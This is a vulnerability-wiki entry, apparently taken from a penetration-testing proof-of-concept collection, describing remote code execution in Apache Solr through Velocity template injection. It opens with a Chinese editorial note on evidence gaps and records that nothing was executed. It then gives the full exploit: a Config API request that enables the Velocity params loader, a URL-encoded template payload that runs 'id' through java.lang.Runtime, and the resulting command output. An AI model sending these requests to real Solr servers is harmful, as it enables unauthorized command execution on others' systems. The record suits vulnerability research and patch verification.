---
source: "Mr-xn/Penetration_Testing_POC"
title: "Apache Solr RCE via Velocity Template Injection"
product: "Apache Solr VelocityResponseWriter"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "可修改core Config API/存在Velocity writer、params.resource.loader.enabled=true、相关类可用"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-17f50547d1dfcf1e9c5a9451"
entity_id: "ve-17f50547d1dfcf1e9c5a9451"
schema_version: "1"
---

# Apache Solr RCE via Velocity Template Injection

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：可修改core Config API/存在Velocity writer、params.resource.loader.enabled=true、相关类可用
- 证据范围：两请求和id响应连贯，与17558类资料同一入口；应核对版本后关联，不机械补号。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 没有版本、认证与修复说明
- 全部正文包在一个代码块，类型应分请求/响应/说明
- 配置API修改有持久副作用，初始及恢复配置未记录
- 请求Host solr与localhost不一致；固定长度需随内容变化

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

```
Apache Solr RCE via Velocity template

Set "params.resource.loader.enabled" as true.

Request:
========================================================================
POST /solr/test/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
========================================================================


RCE via velocity template
Request:
========================================================================
GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: localhost:8983
========================================================================


Response:
========================================================================
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 56

     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
========================================================================
```

> from : https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt


---

> 来源：Mr-xn/Penetration_Testing_POC
